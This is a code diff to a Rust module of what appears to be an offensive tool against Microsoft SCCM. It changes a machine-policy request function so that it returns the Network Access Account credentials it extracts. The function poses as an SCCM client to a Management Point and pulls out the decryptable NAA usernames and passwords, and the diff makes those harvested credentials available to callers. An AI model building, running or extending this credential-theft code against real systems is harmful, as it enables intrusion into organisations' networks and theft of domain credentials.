@@ -213,7 +213,14 @@ impl SccmScanner {
     /// This requires sending a well-crafted XML payload to the Management Point
     /// masquerading as a newly registered or existing SCCM Client. The MP then
     /// encrypts the resulting policy using a provided public key.
-    pub async fn request_machine_policy(&self, site_code: &str) -> Result<Option<String>> {
+    ///
+    /// Returns `(raw_body, extracted_naa_credentials)`.  The body is the raw XML
+    /// response from the Management Point.  The credentials vec is non-empty when
+    /// the policy contained decryptable NetworkAccessAccount entries.
+    pub async fn request_machine_policy(
+        &self,
+        site_code: &str,
+    ) -> Result<(Option<String>, Vec<NaaCredential>)> {
         let endpoint = format!("http://{}/ccm_system/request", self.config.target);
         info!("Attempting Machine Policy extraction from {}", endpoint);
 
@@ -318,7 +325,7 @@ impl SccmScanner {
                 "Management Point rejected the machine policy request. Status: {}",
                 response.status()
             );
-            return Ok(None);
+            return Ok((None, Vec::new()));
         }
 
         let body = response
@@ -335,7 +342,7 @@ impl SccmScanner {
         // the Network Access Accounts inside `<NetworkAccessAccount>`.
         // Decryption requires the private key corresponding to the public key we attached.
 
-        // Extract the blobs (stubbed parser)
+        // Extract NAA credentials from the policy XML
         // Look for NetworkAccessUsername and NetworkAccessPassword inside the policy XML
         let mut naas: Vec<NaaCredential> = Vec::new();
 
@@ -408,15 +415,15 @@ impl SccmScanner {
         }
 
         if !naas.is_empty() {
-            // For now just returning the raw body to maintain signature,
-            // but the NAAs can be stored or passed to the caller struct
-            return Ok(Some(body));
+            info!(
+                "[SCCM] Extracted {} Network Access Account credential(s)",
+                naas.len()
+            );
+        } else {
+            warn!("[SCCM] No decryptable NAA credentials found in machine policy response");
         }
 
-        warn!(
-            "Network Access Accounts were found, but failed to decrypt using the generated RSA private key."
-        );
-        Ok(Some(body))
+        Ok((Some(body), naas))
     }
 
     /// Generates PowerShell commands to query WMI for SCCM Site data
